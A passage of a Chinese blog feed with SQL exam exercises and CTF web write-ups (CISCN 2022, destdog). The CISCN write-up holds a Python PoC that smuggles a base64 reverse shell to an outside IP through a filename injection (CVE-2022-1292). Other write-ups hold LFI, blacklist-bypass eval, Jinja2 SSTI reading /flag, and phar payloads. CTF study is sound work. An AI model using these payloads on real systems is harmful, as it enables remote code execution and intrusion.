class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ssex<span class="operator">=</span>&quot;男&quot; <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) &quot;男生人数&quot;,<span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ssex<span class="operator">=</span>&quot;女&quot; <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) &quot;女生人数&quot; <span class="keyword">FROM</span> </span><br><span class="line">(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> Sdept<span class="operator">=</span>&quot;侦查系&quot;) a</span><br><span class="line"></span><br><span class="line"><span class="number">8</span>、查询姓名中含有“雷”字的学生信息。</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> sname REGEXP &quot;雷&quot;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> sname <span class="keyword">LIKE</span> &quot;%雷%&quot;</span><br><span class="line"></span><br><span class="line"><span class="number">9</span>、查询现年龄大于<span class="number">30</span>岁的学生信息。</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> <span class="keyword">YEAR</span>(<span class="built_in">CURRENT_DATE</span>())<span class="operator">-</span><span class="keyword">YEAR</span>(sbirth)<span class="operator">&gt;</span><span class="number">30</span></span><br><span class="line"></span><br><span class="line"><span class="number">10</span>、查询平均成绩大于<span class="number">80</span>的学生学号和姓名。</span><br><span class="line"><span class="keyword">SELECT</span> student.Sno,student.sname <span class="keyword">from</span> student </span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> (</span><br><span class="line"><span class="keyword">SELECT</span> Sno,<span class="built_in">AVG</span>(Score)<span class="keyword">AS</span> av  <span class="keyword">from</span> sc <span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno <span class="keyword">HAVING</span> <span class="built_in">AVG</span>(Score)<span class="operator">&gt;=</span><span class="number">80</span></span><br><span class="line">)a</span><br><span class="line"><span class="keyword">on</span> student.Sno <span class="operator">=</span> a.Sno;</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="number">11</span>、查询平均成绩大于<span class="number">80</span>的学生学号、姓名和平均成绩。（派生表）</span><br><span class="line"><span class="keyword">SELECT</span> student.Sno,student.sname,<span class="built_in">AVG</span>(sc.Score) <span class="keyword">from</span> student,sc </span><br><span class="line"><span class="keyword">WHERE</span> student.Sno <span class="operator">=</span> sc.Sno <span class="keyword">GROUP</span> <span class="keyword">BY</span> student.Sno <span class="keyword">HAVING</span> <span class="built_in">AVG</span>(sc.Score)<span class="operator">&gt;</span><span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="number">12</span>、统计选修了语文课的学生人数。</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> Cno<span class="operator">=</span>&quot;02&quot; <span class="operator">&amp;&amp;</span> Score<span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> sc</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(Cno) <span class="keyword">FROM</span> sc <span class="keyword">where</span> Cno<span class="operator">=</span>&quot;02&quot; <span class="operator">&amp;&amp;</span> Score<span class="operator">&gt;</span><span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">13</span>、统计至少选修了<span class="number">2</span>号课和<span class="number">3</span>号课的学生人数。</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(Sno) <span class="keyword">FROM</span> sc <span class="keyword">WHERE</span> Cno <span class="operator">=</span> &quot;02&quot; <span class="keyword">and</span> Sno <span class="keyword">in</span> (<span class="keyword">SELECT</span> Sno <span class="keyword">FROM</span> sc <span class="keyword">WHERE</span> Cno<span class="operator">=</span>&quot;03&quot;)</span><br><span class="line"></span><br><span class="line"><span class="number">14</span>、统计至少选修了<span class="number">3</span>门课程的学生人数。</span><br><span class="line"><span class="keyword">SELECT</span> Sno,<span class="built_in">COUNT</span>(Cno)<span class="keyword">FROM</span> sc <span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno <span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(Cno)<span class="operator">=</span><span class="number">3</span>;</span><br><span class="line">#问题：怎么排除成绩为<span class="keyword">null</span>的情况</span><br><span class="line"></span><br><span class="line"><span class="number">15</span>、统计每一门选修人数，并显示超过<span class="number">5</span>人的课程。</span><br><span class="line"><span class="keyword">SELECT</span> Cno,<span class="built_in">COUNT</span>(Cno) <span class="keyword">FROM</span> sc <span class="keyword">GROUP</span> <span class="keyword">BY</span> Cno <span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(Cno)<span class="operator">&gt;</span><span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="number">16</span>、在SC中插入一条学号为<span class="number">07</span>的学生选修<span class="number">01</span>号课程的记录。</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc(Sno,Cno) <span class="keyword">VALUES</span>(&quot;07&quot;,&quot;01&quot;);</span><br><span class="line"></span><br><span class="line"><span class="number">17</span>、删除所有男生的选课课程成绩。</span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> sc <span class="keyword">WHERE</span> Sno <span class="keyword">in</span> (<span class="keyword">SELECT</span> Sno <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> ssex<span class="operator">=</span>&quot;男&quot;)</span><br><span class="line"></span><br><span class="line"><span class="number">18</span>、将所有女生的成绩修改成<span class="keyword">NULL</span>。</span><br><span class="line"><span class="keyword">UPDATE</span> sc <span class="keyword">SET</span> Score <span class="operator">=</span> <span class="keyword">NULL</span> <span class="keyword">WHERE</span> Sno <span class="keyword">IN</span> (<span class="keyword">SELECT</span> Sno <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> ssex<span class="operator">=</span>&quot;女&quot;)</span><br><span class="line"></span><br><span class="line"><span class="number">19</span>、查询所有学生的学号、性别、选修课程以及成绩。</span><br><span class="line"><span class="keyword">SELECT</span> a.Sno,a.ssex,b.Cno,b.Score</span><br><span class="line"><span class="keyword">FROM</span> student <span class="keyword">as</span> a</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> sc <span class="keyword">as</span> b</span><br><span class="line"><span class="keyword">ON</span> a.Sno <span class="operator">=</span> b.Sno</span><br><span class="line"></span><br><span class="line"><span class="number">20</span>、查询每门课的最高成绩。</span><br><span class="line"><span class="keyword">SELECT</span> Cno,<span class="built_in">MAX</span>(Score) <span class="keyword">FROM</span> sc <span class="keyword">GROUP</span> <span class="keyword">BY</span> Cno</span><br><span class="line"></span><br><span class="line"><span class="number">21</span>、查询每门课的平均成绩。</span><br><span class="line"><span class="keyword">SELECT</span> Cno,<span class="built_in">AVG</span>(Score) <span class="keyword">FROM</span> sc <span class="keyword">GROUP</span> <span class="keyword">BY</span> Cno</span><br><span class="line"></span><br><span class="line"><span class="number">22</span>、查询数学成绩低于<span class="number">90</span>的学生信息。</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> Sno <span class="keyword">IN</span> (<span class="keyword">SELECT</span> Sno <span class="keyword">FROM</span> sc <span class="keyword">WHERE</span> Cno<span class="operator">=</span>&quot;01&quot;<span class="operator">&amp;&amp;</span>Score<span class="operator">&lt;</span><span class="number">90</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">数据库课程期末考试复习</summary>
    
    
    
    <category term="database" scheme="https://xianbeil.github.io/categories/database/"/>
    
    
    <category term="数据库" scheme="https://xianbeil.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>ciscn2022初赛online-cert题解</title>
    <link href="https://xianbeil.github.io/2022/06/01/ciscn2022online-cert/"/>
    <id>https://xianbeil.github.io/2022/06/01/ciscn2022online-cert/</id>
    <published>2022-06-01T06:26:17.000Z</published>
    <updated>2022-06-02T00:37:08.693Z</updated>
    
    <content type="html"><![CDATA[<p>这道题当时最后黑灯的时候做出来的，就是卡在最后的payload构造和vps的问题上，比赛前一天一直用的腾讯云过期了，又没钱补，想着问谁借一个能弹shell就行了，没想到控制台安全组放开没用，他还有个宝塔也要一起放开才有用，最后还是借到一个能弹shell的成功了。</p><p>感觉这道题对于我来说难点在于对perl脚本的审计，和最后的利用，总体思路其实不难想出。</p><h3 id="CVE-2022-1292"><a href="#CVE-2022-1292" class="headerlink" title="CVE-2022-1292"></a>CVE-2022-1292</h3><p><a href="https://github.com/openssl/openssl/commit/7c33270707b568c524a8ef125fe611a8872cb5e8?diff=split">https://github.com/openssl/openssl/commit/7c33270707b568c524a8ef125fe611a8872cb5e8?diff=split</a></p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220531235646-3mpqktf.png" alt="image.png"></p><p>filename被拼接到了反引号里</p><p>而且他的go web服务里也有一个修改文件名的地方，所以整个题目思路就是在文件名里面插入恶意数据造成rce</p><h3 id="crlf注入"><a href="#crlf注入" class="headerlink" title="crlf注入"></a>crlf注入</h3><p>app.py里面写的，完全可以完整的注入一个报文</p><p>接着绕过URL.RawPath就行，后来翻看了go web开发相关的文章，了解到这玩意是url安全编码相关的，于是就把请求的url中间的一部分编码了就绕过了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2ze9sic3tak432765s8u.cloudeci1.ichunqiu.com:8888/proxy&quot;</span></span><br><span class="line">url1 = <span class="string">&quot;http://127.0.0.1:8888/proxy&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;/%61%64%6d%69%6e/rename?oldname=123&amp;newname=1.crt%22%3Becho%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC80Ny4xMDQuMTQuMTYwLzQ0NDQgMD4mMQ%3D%3D%20%7C%20base64%20-d%20%7C%20bash%20-i%3Becho%22 HTTP/1.1</span></span><br><span class="line"><span class="string">Host: admin</span></span><br><span class="line"><span class="string">User-Agent: admin</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /index&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\\n&quot;</span>,<span class="string">&quot;\\r\\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;uri&quot;</span>:payload&#125;</span><br><span class="line"></span><br><span class="line">r1 = requests.get(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r1.text)</span><br></pre></td></tr></table></figure><h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h3><p>这里怎么rce，我用的是拼接的方式，当然赛后还看到大师傅的wp中有用环境变量的姿势。</p><p>我觉得这里才是这道题的细节部分，就是最后一步的处理问题：如何精心构造文件名。</p><p>linux中的文件名不能包含斜杠<code>/</code>，所以采用base64编码是首选</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="string">&quot;$openssl&quot;</span> x509 $x509hash -fingerprint -noout -<span class="keyword">in</span> <span class="string">&quot;$fname&quot;</span>`;</span><br></pre></td></tr></table></figure><p>可以看到可控的部分是<code>$filename</code>，因此做如下截断，通过分号截断命令，然后管道符base64解码其实也是常见姿势：</p><p>（当然当时比赛试了n遍）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;echo YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDQuMTQuMTYwLzQ0NDQgMD4mMQ== | base64 -d | bash -i;echo&quot;</span></span><br></pre></td></tr></table></figure><p>最后通过url编码，在我上面构造的poc中能够打通</p><p>赛后看一个师傅的wp中，他使用环境变量<code>$&#123;OLDPWD&#125;</code>，直接截图引用大佬橙子酱的分析</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220601001446-1w2wibk.png" alt="image.png"></p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220601001456-ekakhly.png" alt="image.png"></p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220601001515-m3jocjn.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">对初赛中的一道简单题的分析</summary>
    
    
    
    <category term="ctfStudy" scheme="https://xianbeil.github.io/categories/ctfStudy/"/>
    
    
    <category term="wp" scheme="https://xianbeil.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>destdog招新赛web-部分题解</title>
    <link href="https://xianbeil.github.io/2022/05/30/destdog%E6%8B%9B%E6%96%B0%E8%B5%9Bweb/"/>
    <id>https://xianbeil.github.io/2022/05/30/destdog%E6%8B%9B%E6%96%B0%E8%B5%9Bweb/</id>
    <published>2022-05-30T06:29:37.000Z</published>
    <updated>2022-06-02T00:37:08.690Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>还有很多不足的地方需要学习<br><img src="https://i.imgur.com/f1OQwdW.png"></p></blockquote><h2 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span><span class="params">(__FILE__)</span>;</span><br><span class="line">require_once <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    require_once($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比较简单，proc突破require_once的限制即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span></span><br></pre></td></tr></table></figure><h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;fl4g.php&quot;</span>;</span><br><span class="line"><span class="variable">$dest0g3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;H&quot;</span>);</span><br><span class="line"><span class="variable">$timme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="variable">$timmme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$time</span> &gt; <span class="string">&quot;24&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timme</span> &gt; <span class="string">&quot;31&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timmme</span> &gt; <span class="string">&quot;60&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(</span><br><span class="line">    function() <span class="keyword">use</span>(&amp;$<span class="title">fl4g</span>) &#123;</span><br><span class="line">        <span class="title">print</span> $<span class="title">fl4g</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$fl4g</span> .= <span class="variable">$dest0g3</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>让他报错，调用set_error_handler即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf[]=<span class="variable">$timme</span></span><br></pre></td></tr></table></figure><h2 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$aaa</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;pastre&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;pcre&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;diff&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;sort&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;cut&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;vi&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$black_list</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没过滤<code>~</code>，取反</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa=(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%D0%D5);</span><br></pre></td></tr></table></figure><h2 id="blockchain"><a href="#blockchain" class="headerlink" title="blockchain"></a>blockchain</h2><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220520105139-rmdsblo.png" alt="image.png"></p><h2 id="EasySSTI"><a href="#EasySSTI" class="headerlink" title="EasySSTI"></a>EasySSTI</h2><p>过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">request</span><br><span class="line">[</span><br><span class="line">.</span><br><span class="line">_</span><br><span class="line">空格</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>过滤器构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span>(zero)=(self|<span class="built_in">int</span>)%&#125;&#123;%<span class="built_in">set</span>(one)=(zero**zero)|<span class="built_in">int</span>%&#125;&#123;%<span class="built_in">set</span>(two)=(zero-one-one)|<span class="built_in">abs</span>%&#125;&#123;%<span class="built_in">set</span>(four)=(two*two)|<span class="built_in">int</span>%&#125;&#123;%<span class="built_in">set</span>(five)=(two*two*two)-one-one-one%&#125;&#123;%<span class="built_in">set</span>(three)=five-one-one%&#125;&#123;%<span class="built_in">set</span>(nine)=(two*two*two*two-five-one-one)%&#125;&#123;%<span class="built_in">set</span>(seven)=(zero-one-one-five)|<span class="built_in">abs</span>%&#125;&#123;%<span class="built_in">set</span>(space)=self|string|<span class="built_in">min</span>%&#125;&#123;%<span class="built_in">set</span>(point)=self|<span class="built_in">float</span>|string|<span class="built_in">min</span>%&#125;&#123;%<span class="built_in">set</span>(c)=<span class="built_in">dict</span>(c=aa)|reverse|first%&#125;&#123;%<span class="built_in">set</span>(bfh)=self|string|urlencode|first%&#125;&#123;%<span class="built_in">set</span>(bfhc)=bfh~c%&#125;&#123;%<span class="built_in">set</span>(slas)=bfhc%((four~seven)|<span class="built_in">int</span>)%&#125;&#123;%<span class="built_in">set</span>(yin)=bfhc%((three~nine)|<span class="built_in">int</span>)%&#125;&#123;%<span class="built_in">set</span>(xhx)=bfhc%((nine~five)|<span class="built_in">int</span>)%&#125;&#123;%<span class="built_in">set</span>(right)=bfhc%((four~one)|<span class="built_in">int</span>)%&#125;&#123;%<span class="built_in">set</span>(left)=bfhc%((four~zero)|<span class="built_in">int</span>)%&#125;&#123;%<span class="built_in">set</span>(but)=<span class="built_in">dict</span>(buil=aa,tins=dd)|join%&#125;&#123;%<span class="built_in">set</span>(imp)=<span class="built_in">dict</span>(imp=aa,ort=dd)|join%&#125;&#123;%<span class="built_in">set</span>(pon)=<span class="built_in">dict</span>(po=aa,pen=dd)|join%&#125;&#123;%<span class="built_in">set</span>(so)=<span class="built_in">dict</span>(o=aa,s=dd)|join%&#125;&#123;%<span class="built_in">set</span>(ca)=<span class="built_in">dict</span>(ca=aa,t=dd)|join%&#125;&#123;%<span class="built_in">set</span>(flg)=<span class="built_in">dict</span>(fl=aa,ag=dd)|join%&#125;&#123;%<span class="built_in">set</span>(ev)=<span class="built_in">dict</span>(ev=aa,al=dd)|join%&#125;&#123;%<span class="built_in">set</span>(red)=<span class="built_in">dict</span>(re=aa,ad=dd)|join%&#125;&#123;%<span class="built_in">set</span>(bul)=xhx~xhx~but~xhx~xhx%&#125;&#123;%<span class="built_in">set</span>(ini)=<span class="built_in">dict</span>(ini=aa,t=bb)|join%&#125;&#123;%<span class="built_in">set</span>(glo)=<span class="built_in">dict</span>(glo=aa,bals=bb)|join%&#125;&#123;%<span class="built_in">set</span>(itm)=<span class="built_in">dict</span>(ite=aa,ms=bb)|join%&#125;&#123;%<span class="built_in">set</span>(pld)=xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right%&#125;&#123;%<span class="keyword">for</span>(f,v)<span class="keyword">in</span>((self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))())%&#125;&#123;%<span class="keyword">if</span>(f==bul)%&#125;&#123;%<span class="keyword">for</span>(a,b)<span class="keyword">in</span>(v|attr(itm))()%&#125;&#123;%<span class="keyword">if</span>(a==ev)%&#125;&#123;&#123;b(pld)&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure><h2 id="pharpop"><a href="#pharpop" class="headerlink" title="pharpop"></a>pharpop</h2><p>fast destruct绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">air</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$p</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p-&gt;act;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$p</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tree</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$act</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">name</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">   